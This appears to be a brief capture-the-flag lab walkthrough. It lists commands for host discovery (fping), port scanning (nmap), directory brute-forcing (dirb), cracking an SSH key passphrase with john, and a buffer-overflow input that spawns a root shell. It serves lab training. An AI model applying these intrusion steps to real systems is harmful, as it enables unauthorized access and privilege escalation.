I used fping -aqg 192.168.56.1/24
got it's address a 192.168.56.104
 used nmap and found ports :
 	22
 	80 
 	and 31337 

did dirb http://$IP
 and found hidden page on 31337 called .ssh
 downloaded all files from that page
 used 
 	ssh2john id_rsa > result 
 	john result
 	and the id_rsa password as STARWARS
 	 logged in moved to root
 	 found a *.c file
 	 read it and saw it used strcmp()
 	 and buffer size of 20
 	 wanted Simon as input but i put in Simona*(15)/bin/sh
 	 spawned a shell 
 	 got the root flag
